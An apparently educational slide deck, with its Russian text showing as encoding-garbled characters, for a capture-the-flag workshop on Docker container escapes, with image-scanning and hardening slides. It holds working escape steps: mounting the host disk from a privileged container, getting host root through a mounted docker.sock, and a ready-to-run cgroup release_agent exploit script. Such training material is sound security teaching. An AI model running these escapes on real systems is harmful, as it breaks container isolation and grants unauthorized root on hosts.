---
marp: true
theme: default
paginate: true
---

# –ü–æ–±–µ–≥ –∏–∑ –¥–æ–∫–µ—Ä-–∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞

## CTF Workshop

**–û–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã–π –≤–æ—Ä–∫—à–æ–ø –ø–æ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–æ–≤**

---

## –ü–ª–∞–Ω –≤–æ—Ä–∫—à–æ–ø–∞ (60 –º–∏–Ω—É—Ç)

1. **–í–≤–µ–¥–µ–Ω–∏–µ** - 5 –º–∏–Ω
2. **3 –ø—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏—Ö –∑–∞–¥–∞–Ω–∏—è** - 45 –º–∏–Ω
   - Privileged –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ã
   - Docker socket escape
   - CAP_SYS_ADMIN –ø–æ–±–µ–≥
3. **–ò–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –¥–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∏** (Trivy/Scout) - 7 –º–∏–Ω
4. **–ó–∞—â–∏—Ç–∞ –∏ –≤—ã–≤–æ–¥—ã** - 3 –º–∏–Ω

---

## –î–ª—è –∫–æ–≥–æ —ç—Ç–æ—Ç –≤–æ—Ä–∫—à–æ–ø?

**–¶–µ–ª–µ–≤–∞—è –∞—É–¥–∏—Ç–æ—Ä–∏—è:**

‚úÖ **DevOps / SRE –∏–Ω–∂–µ–Ω–µ—Ä—ã** - —Ä–∞–±–æ—Ç–∞–µ—Ç–µ —Å Docker –≤ production
‚úÖ **Backend —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∏** - –ø–∏—à–µ—Ç–µ Dockerfile –∏ docker-compose
‚úÖ **Junior Security Engineers** - —Ö–æ—Ç–∏—Ç–µ –ø–æ–Ω—è—Ç—å container security
‚úÖ **–°—Ç—É–¥–µ–Ω—Ç—ã DevSecOps** - –Ω—É–∂–µ–Ω –ø—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏–π –æ–ø—ã—Ç

**–£—Ä–æ–≤–µ–Ω—å:** Intermediate (–±–∞–∑–æ–≤—ã–µ –∑–Ω–∞–Ω–∏—è Docker —Ç—Ä–µ–±—É—é—Ç—Å—è)

**–ß—Ç–æ –ø–æ–ª—É—á–∏—Ç–µ:**

- –ü–æ–Ω–∏–º–∞–Ω–∏–µ —Ä–µ–∞–ª—å–Ω—ã—Ö –≤–µ–∫—Ç–æ—Ä–æ–≤ –∞—Ç–∞–∫ –Ω–∞ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ã
- –ü—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏–π –æ–ø—ã—Ç –ø–æ–±–µ–≥–∞ –∏–∑ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–æ–≤
- –ù–∞–≤—ã–∫–∏ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –æ–±—Ä–∞–∑–æ–≤ (Trivy/Scout)
- –ì–æ—Ç–æ–≤—ã–µ –ø—Ä–∏–º–µ—Ä—ã –±–µ–∑–æ–ø–∞—Å–Ω—ã—Ö –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–π

---

## Prerequisites: –ß—Ç–æ –Ω—É–∂–Ω–æ –∑–Ω–∞—Ç—å?

**–í–æ–ø—Ä–æ—Å –∫ –∞—É–¥–∏—Ç–æ—Ä–∏–∏:** –ö—Ç–æ –∏–∑ –≤–∞—Å –∑–∞–ø—É—Å–∫–∞–ª Docker –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ã? üôã

**Docker –∑–∞ 30 —Å–µ–∫—É–Ω–¥ (–µ—Å–ª–∏ –≤—ã –Ω–µ —É–≤–µ—Ä–µ–Ω—ã):**

```bash
# Docker = –ø–ª–∞—Ç—Ñ–æ—Ä–º–∞ –¥–ª—è –∑–∞–ø—É—Å–∫–∞ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π –≤ –∏–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞—Ö
docker pull ubuntu          # –°–∫–∞—á–∞—Ç—å –æ–±—Ä–∞–∑ (—à–∞–±–ª–æ–Ω)
docker run -it ubuntu bash  # –ó–∞–ø—É—Å—Ç–∏—Ç—å –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä (—ç–∫–∑–µ–º–ø–ª—è—Ä)
docker ps                   # –°–ø–∏—Å–æ–∫ –∑–∞–ø—É—â–µ–Ω–Ω—ã—Ö –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–æ–≤
docker exec -it <id> bash   # –ü–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è –∫ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—É
```

**–û–±—Ä–∞–∑** = —à–∞–±–ª–æ–Ω —Å –û–° –∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ–º | **–ö–æ–Ω—Ç–µ–π–Ω–µ—Ä** = –∑–∞–ø—É—â–µ–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å –∏–∑ –æ–±—Ä–∞–∑–∞

---

## –í–≤–µ–¥–µ–Ω–∏–µ: –ß—Ç–æ —Ç–∞–∫–æ–µ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä?

- –ò–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–Ω–æ–µ –æ–∫—Ä—É–∂–µ–Ω–∏–µ –¥–ª—è –∑–∞–ø—É—Å–∫–∞ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π
- –ò—Å–ø–æ–ª—å–∑—É–µ—Ç namespaces –∏ cgroups —è–¥—Ä–∞ Linux
- –ù–µ –ø–æ–ª–Ω–∞—è –≤–∏—Ä—Ç—É–∞–ª–∏–∑–∞—Ü–∏—è - —Ä–∞–∑–¥–µ–ª—è–µ—Ç —è–¥—Ä–æ —Å —Ö–æ—Å—Ç–æ–º
- –ò–∑–æ–ª—è—Ü–∏—è ‚â† –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é

```bash
docker run -it ubuntu:latest /bin/bash
```

---

<!-- ## –ú–æ–¥–µ–ª—å –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ Docker

**–û—Å–Ω–æ–≤–Ω—ã–µ –º–µ—Ö–∞–Ω–∏–∑–º—ã –∑–∞—â–∏—Ç—ã:**

- **Namespaces** - –∏–∑–æ–ª—è—Ü–∏—è –ø—Ä–æ—Ü–µ—Å—Å–æ–≤, —Å–µ—Ç–∏, —Ñ–∞–π–ª–æ–≤–æ–π —Å–∏—Å—Ç–µ–º—ã
- **Capabilities** - –≥—Ä–∞–Ω—É–ª—è—Ä–Ω—ã–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏ –≤–º–µ—Å—Ç–æ –ø–æ–ª–Ω–æ–≥–æ root
- **Seccomp** - —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏—è —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤
- **AppArmor/SELinux** - –ø–æ–ª–∏—Ç–∏–∫–∏ –¥–æ—Å—Ç—É–ø–∞

‚ö†Ô∏è **–ò–∑–æ–ª—è—Ü–∏—è ‚â† –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é!**

--- -->

## –†–µ–∞–ª—å–Ω—ã–µ –∏–Ω—Ü–∏–¥–µ–Ω—Ç—ã

**Tesla Kubernetes (2018)**

- –ù–µ–∑–∞—â–∏—â–µ–Ω–Ω–∞—è Kubernetes –∫–æ–Ω—Å–æ–ª—å –±–µ–∑ –ø–∞—Ä–æ–ª—è
- –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∏ —Ä–∞–∑–≤–µ—Ä–Ω—É–ª–∏ –∫—Ä–∏–ø—Ç–æ–º–∞–π–Ω–µ—Ä—ã
- –î–æ—Å—Ç—É–ø –∫ AWS credentials –∏–∑ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–æ–≤

**Graboid Worm (2019)**

- –ü–µ—Ä–≤—ã–π worm –¥–ª—è Docker
- –°–∫–∞–Ω–∏—Ä–æ–≤–∞–ª –∏–Ω—Ç–µ—Ä–Ω–µ—Ç –Ω–∞ –æ—Ç–∫—Ä—ã—Ç—ã–µ Docker API (–ø–æ—Ä—Ç 2375)
- –ó–∞–ø—É—Å–∫–∞–ª –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ã —Å –∫—Ä–∏–ø—Ç–æ–º–∞–π–Ω–µ—Ä–∞–º–∏
- **~2000 —Ö–æ—Å—Ç–æ–≤ –∑–∞—Ä–∞–∂–µ–Ω–æ**

---

## –†–µ–∞–ª—å–Ω—ã–µ –∏–Ω—Ü–∏–¥–µ–Ω—Ç—ã (–ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏–µ)

**Docker Hub Breach (2019)**

- –ö–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏—è 190,000 –∞–∫–∫–∞—É–Ω—Ç–æ–≤
- –£—Ç–µ—á–∫–∞ —Ç–æ–∫–µ–Ω–æ–≤ GitHub –∏ Bitbucket –∏–∑ –æ–±—Ä–∞–∑–æ–≤
- –ü—Ä–æ–±–ª–µ–º–∞: —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∏ —Ö—Ä–∞–Ω–∏–ª–∏ —Å–µ–∫—Ä–µ—Ç—ã –≤ –æ–±—Ä–∞–∑–∞—Ö

**TeamTNT Campaign (2020-2023)**

- –ö—Ä—É–ø–Ω–µ–π—à–∞—è –∫–∞–º–ø–∞–Ω–∏—è –∞—Ç–∞–∫ –Ω–∞ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ã
- –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è –æ—Ç–∫—Ä—ã—Ç—ã—Ö Docker API –∏ Kubernetes
- –ö—Ä–∞–∂–∞ AWS credentials, –∫—Ä–∏–ø—Ç–æ–º–∞–π–Ω–∏–Ω–≥, backdoors
- –ú–∏–ª–ª–∏–æ–Ω—ã —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–π –≤ –¥–µ–Ω—å

**–í—ã–≤–æ–¥:** –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∞—è –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è = —Ä–µ–∞–ª—å–Ω–∞—è —É–≥—Ä–æ–∑–∞

---

## –í–µ–∫—Ç–æ—Ä #1: Privileged –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ã

**–ü—Ä–æ–±–ª–µ–º–∞:** `--privileged` —Ñ–ª–∞–≥ –æ—Ç–∫–ª—é—á–∞–µ—Ç –±–æ–ª—å—à–∏–Ω—Å—Ç–≤–æ –∑–∞—â–∏—Ç

```bash
docker run --privileged -it ubuntu /bin/bash
```

**–ß—Ç–æ –ø–æ–ª—É—á–∞–µ—Ç –∞—Ç–∞–∫—É—é—â–∏–π:**

- –î–æ—Å—Ç—É–ø –∫–æ –≤—Å–µ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞–º —Ö–æ—Å—Ç–∞ (`/dev`)
- –í—Å–µ Linux capabilities
- –í–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —Ñ–∞–π–ª–æ–≤—ã—Ö —Å–∏—Å—Ç–µ–º

---

## –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞: –ó–∞–ø—É—Å–∫ –∑–∞–¥–∞–Ω–∏–π

**–î–ª—è –æ—Ä–≥–∞–Ω–∏–∑–∞—Ç–æ—Ä–∞ –≤–æ—Ä–∫—à–æ–ø–∞:**

```bash
# –ó–∞–¥–∞–Ω–∏–µ 1: Privileged –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä
echo "FLAG{pr1v1leged_m0de_danger}" > /root/flag.txt
docker run -it --privileged --name ctf-task1 ubuntu

# –ó–∞–¥–∞–Ω–∏–µ 2: Docker socket
docker run -it -v /var/run/docker.sock:/var/run/docker.sock \
  --name ctf-task2 docker:latest sh

# –ó–∞–¥–∞–Ω–∏–µ 3: CAP_SYS_ADMIN
docker run -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined \
  --name ctf-task3 ubuntu
```

---

## ‚úÖ –ó–∞–¥–∞–Ω–∏–µ 1: –ü–æ–±–µ–≥ —á–µ—Ä–µ–∑ privileged —Ä–µ–∂–∏–º

**–°—Ü–µ–Ω–∞—Ä–∏–π:** –í—ã –ø–æ–ª—É—á–∏–ª–∏ –¥–æ—Å—Ç—É–ø –∫ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—É, –∑–∞–ø—É—â–µ–Ω–Ω–æ–º—É —Å `--privileged`

**–¶–µ–ª—å:** –ü—Ä–æ—á–∏—Ç–∞—Ç—å —Ñ–∞–π–ª `/root/flag.txt` —Å —Ö–æ—Å—Ç–∞

**–ü–æ—à–∞–≥–æ–≤—ã–π –ø–ª–∞–Ω:**

1. –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ —É—Ç–∏–ª–∏—Ç—É –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å –¥–∏—Å–∫–∞–º–∏`apt-get update` `apt-get -y install fdisk`
2. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –¥–æ—Å—Ç—É–ø–Ω—ã–µ –¥–∏—Å–∫–∏: `fdisk -l`
3. –ù–∞–π–¥–∏—Ç–µ –æ—Å–Ω–æ–≤–Ω–æ–π –¥–∏—Å–∫ —Ö–æ—Å—Ç–∞ (–æ–±—ã—á–Ω–æ `/dev/sda1` –∏–ª–∏ `/dev/vda1`)
4. –°–æ–∑–¥–∞–π—Ç–µ —Ç–æ—á–∫—É –º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏—è: `mkdir /mnt/host`
5. –°–º–æ–Ω—Ç–∏—Ä—É–π—Ç–µ –¥–∏—Å–∫: `mount /dev/sda1 /mnt/host`
6. –¢–µ–ø–µ—Ä—å –§–° —Ö–æ—Å—Ç–∞ –¥–æ—Å—Ç—É–ø–Ω–∞: `cat /mnt/host/root/flag.txt`

---

## –í–µ–∫—Ç–æ—Ä #2: –ù–µ–±–µ–∑–æ–ø–∞—Å–Ω—ã–µ –º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏—è

**–ü—Ä–æ–±–ª–µ–º–∞:** –ú–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∫—Ä–∏—Ç–∏—á–Ω—ã—Ö –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π —Ö–æ—Å—Ç–∞

```bash
docker run -v /:/host -it ubuntu /bin/bash
docker run -v /var/run/docker.sock:/var/run/docker.sock
```

**–†–∏—Å–∫–∏:**

- –ü—Ä—è–º–æ–π –¥–æ—Å—Ç—É–ø –∫ —Ñ–∞–π–ª–∞–º —Ö–æ—Å—Ç–∞
- –í–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è Docker API
- –ó–∞–ø—É—Å–∫ –Ω–æ–≤—ã—Ö –ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–æ–≤

---

## ‚úÖ –ó–∞–¥–∞–Ω–∏–µ 2: Docker socket escape

**–°—Ü–µ–Ω–∞—Ä–∏–π:** –í –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–µ –ø—Ä–∏–º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω `/var/run/docker.sock`

**–¶–µ–ª—å:** –ü–æ–ª—É—á–∏—Ç—å shell –Ω–∞ —Ö–æ—Å—Ç–µ —Å root –ø—Ä–∞–≤–∞–º–∏

**–ü–æ—à–∞–≥–æ–≤—ã–π –ø–ª–∞–Ω:**

1. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –Ω–∞–ª–∏—á–∏–µ socket: `ls -la /var/run/docker.sock`
2. –ü–æ—Å–º–æ—Ç—Ä–∏—Ç–µ –∑–∞–ø—É—â–µ–Ω–Ω—ã–µ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ã: `docker ps`
3. –ó–∞–ø—É—Å—Ç–∏—Ç–µ privileged –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä —Å –º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ–º —Ö–æ—Å—Ç-—Å–∏—Å—Ç–µ–º—ã:
   ```bash
   docker run -it --privileged -v /:/host alpine chroot /host
   ```
4. –í—ã —Ç–µ–ø–µ—Ä—å root –Ω–∞ —Ö–æ—Å—Ç–µ!
5. –ù–∞–π–¥–∏—Ç–µ —Ñ–ª–∞–≥: `cat /root/flag.txt`
6. –ù–∞–π–¥–∏—Ç–µ –Ω–æ–≤—ã–π –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä –Ω–∞ —Ö–æ—Å—Ç–µ

---

## –í–µ–∫—Ç–æ—Ä #3: Misconfigured capabilities

**–ü—Ä–æ–±–ª–µ–º–∞:** –ò–∑–ª–∏—à–Ω–∏–µ capabilities

–û–ø–∞—Å–Ω—ã–µ capabilities:

- `CAP_SYS_ADMIN` - –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–∏–≤–Ω—ã–µ –æ–ø–µ—Ä–∞—Ü–∏–∏
- `CAP_SYS_PTRACE` - –æ—Ç–ª–∞–¥–∫–∞ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤
- `CAP_SYS_MODULE` - –∑–∞–≥—Ä—É–∑–∫–∞ –º–æ–¥—É–ª–µ–π —è–¥—Ä–∞
- `CAP_DAC_READ_SEARCH` - –æ–±—Ö–æ–¥ –ø—Ä–æ–≤–µ—Ä–æ–∫ —á—Ç–µ–Ω–∏—è

```bash
docker run --cap-add=SYS_ADMIN -it ubuntu
```

---

## –ó–∞–¥–∞–Ω–∏–µ 3: CAP_SYS_ADMIN escape

**–°—Ü–µ–Ω–∞—Ä–∏–π:** –ö–æ–Ω—Ç–µ–π–Ω–µ—Ä –∑–∞–ø—É—â–µ–Ω —Å `--cap-add=SYS_ADMIN`

**–¶–µ–ª—å:** –í—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É –Ω–∞ —Ö–æ—Å—Ç–µ –∏—Å–ø–æ–ª—å–∑—É—è cgroups

**–¢–µ—Ö–Ω–∏–∫–∞: release_agent exploit**

Cgroups –ø–æ–∑–≤–æ–ª—è–µ—Ç —É–∫–∞–∑–∞—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—É, –∫–æ—Ç–æ—Ä–∞—è –≤—ã–ø–æ–ª–Ω–∏—Ç—Å—è –Ω–∞ —Ö–æ—Å—Ç–µ –∫–æ–≥–¥–∞ –ø–æ—Å–ª–µ–¥–Ω–∏–π –ø—Ä–æ—Ü–µ—Å—Å –≤ –≥—Ä—É–ø–ø–µ –∑–∞–≤–µ—Ä—à–∏—Ç—Å—è.

**–ì–æ—Ç–æ–≤—ã–π —Å–∫—Ä–∏–ø—Ç:**

```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /root/flag.txt > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

**–†–µ–∑—É–ª—å—Ç–∞—Ç:** –ß–∏—Ç–∞–µ–º `/output` –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–µ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Ñ–ª–∞–≥–∞

**–í—Ä–µ–º—è:** 15-18 –º–∏–Ω—É—Ç

---

## –ö—Ä–∞—Ç–∫–∞—è —Å–≤–æ–¥–∫–∞: 3 –≤–µ–∫—Ç–æ—Ä–∞ –ø–æ–±–µ–≥–∞

| –í–µ–∫—Ç–æ—Ä            | –¢—Ä–µ–±–æ–≤–∞–Ω–∏—è           | –°–ª–æ–∂–Ω–æ—Å—Ç—å | –ó–∞—â–∏—Ç–∞                                   |
| ----------------- | -------------------- | --------- | ---------------------------------------- |
| **Privileged**    | `--privileged` —Ñ–ª–∞–≥  | –õ–µ–≥–∫–æ     | –ù–∏–∫–æ–≥–¥–∞ –Ω–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å                  |
| **Docker socket** | –ú–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ sock    | –õ–µ–≥–∫–æ     | –ù–µ –º–æ–Ω—Ç–∏—Ä–æ–≤–∞—Ç—å –±–µ–∑ –∫—Ä–∞–π–Ω–µ–π –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏ |
| **CAP_SYS_ADMIN** | Capability SYS_ADMIN | –°—Ä–µ–¥–Ω–µ    | `--cap-drop=ALL`, –º–∏–Ω–∏–º–∞–ª—å–Ω—ã–µ caps       |

**–û–±—â–∏–π –ø–∞—Ç—Ç–µ—Ä–Ω:** –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∞—è –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è ‚Üí –¥–æ—Å—Ç—É–ø –∫ —Ä–µ—Å—É—Ä—Å–∞–º —Ö–æ—Å—Ç–∞ ‚Üí escape

---

–°—É—Ç—å –∑–∞—â–∏—Ç—ã: –¥–∞–∂–µ –µ—Å–ª–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –≤–∑–ª–æ–º–∞—é—Ç, –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –Ω–∞—Å—Ç–æ–ª—å–∫–æ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω, —á—Ç–æ –¥–∞–ª—å—à–µ –¥–≤–∏–≥–∞—Ç—å—Å—è –Ω–µ–∫—É–¥–∞.

---

## –ò–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –¥–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∏

**–ó–∞—á–µ–º —Å–∫–∞–Ω–∏—Ä–æ–≤–∞—Ç—å –æ–±—Ä–∞–∑—ã?**

- –£—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ –±–∞–∑–æ–≤—ã—Ö –æ–±—Ä–∞–∑–∞—Ö –∏ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç—è—Ö
- –£—Å—Ç–∞—Ä–µ–≤—à–∏–µ –ø–∞–∫–µ—Ç—ã —Å –∏–∑–≤–µ—Å—Ç–Ω—ã–º–∏ CVE
- Secrets –∏ —á—É–≤—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –≤ —Å–ª–æ—è—Ö
- Misconfiguration –≤ Dockerfile

**–û—Å–Ω–æ–≤–Ω—ã–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã:**

- **Trivy** - –∫–æ–º–ø–ª–µ–∫—Å–Ω—ã–π —Å–∫–∞–Ω–µ—Ä (–Ω–∞—à —Ñ–æ–∫—É—Å)
- **Docker Scout** - –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç Docker
- Snyk, Anchore, Clair

---

## Trivy: –£–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω—ã–π —Å–∫–∞–Ω–µ—Ä

**–ß—Ç–æ —Å–∫–∞–Ω–∏—Ä—É–µ—Ç Trivy:**

- –û–±—Ä–∞–∑—ã –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–æ–≤ (OS –ø–∞–∫–µ—Ç—ã –∏ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π)
- –§–∞–π–ª–æ–≤—ã–µ —Å–∏—Å—Ç–µ–º—ã –∏ rootfs
- Git —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–∏
- Kubernetes –º–∞–Ω–∏—Ñ–µ—Å—Ç—ã
- Terraform/CloudFormation

**–£—Å—Ç–∞–Ω–æ–≤–∫–∞:**

```bash
# Linux
wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -
echo "deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main" | sudo tee -a /etc/apt/sources.list.d/trivy.list
sudo apt-get update && sudo apt-get install trivy
```

---

## Trivy: –ü—Ä–∞–∫—Ç–∏—á–µ—Å–∫–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ

**–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –æ–±—Ä–∞–∑–∞:**

```bash
# –ë–∞–∑–æ–≤–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ
trivy image nginx:latest

# –¢–æ–ª—å–∫–æ –∫—Ä–∏—Ç–∏—á–Ω—ã–µ –∏ –≤—ã—Å–æ–∫–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏
trivy image --severity CRITICAL,HIGH nginx:latest

# –í—ã–≤–æ–¥ –≤ JSON –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏–∏
trivy image -f json -o results.json nginx:latest

# –ò–≥–Ω–æ—Ä–∏—Ä–æ–≤–∞–Ω–∏–µ unfixed —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π
trivy image --ignore-unfixed nginx:latest
```

**–ü—Ä–∏–º–µ—Ä –≤—ã–≤–æ–¥–∞:**

```
nginx:latest (alpine 3.17.0)
========================
Total: 15 (CRITICAL: 2, HIGH: 5, MEDIUM: 8)

‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ   Library     ‚îÇ Vulnerability‚îÇ Severity ‚îÇ  Installed Ver    ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ openssl       ‚îÇ CVE-2023-XXXX‚îÇ CRITICAL ‚îÇ 3.0.7-r0          ‚îÇ
‚îÇ curl          ‚îÇ CVE-2023-YYYY‚îÇ HIGH     ‚îÇ 7.87.0-r0         ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**–ß—Ç–æ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç:** CVE ID, severity, –ø–∞–∫–µ—Ç, –≤–µ—Ä—Å–∏—è, fix (–µ—Å–ª–∏ –µ—Å—Ç—å)

---

## Docker Scout: –í—Å—Ç—Ä–æ–µ–Ω–Ω—ã–π –∞–Ω–∞–ª–∏–∑

**–ò–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è —Å Docker:**

```bash
# –ê–Ω–∞–ª–∏–∑ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –æ–±—Ä–∞–∑–∞
docker scout cves nginx:latest

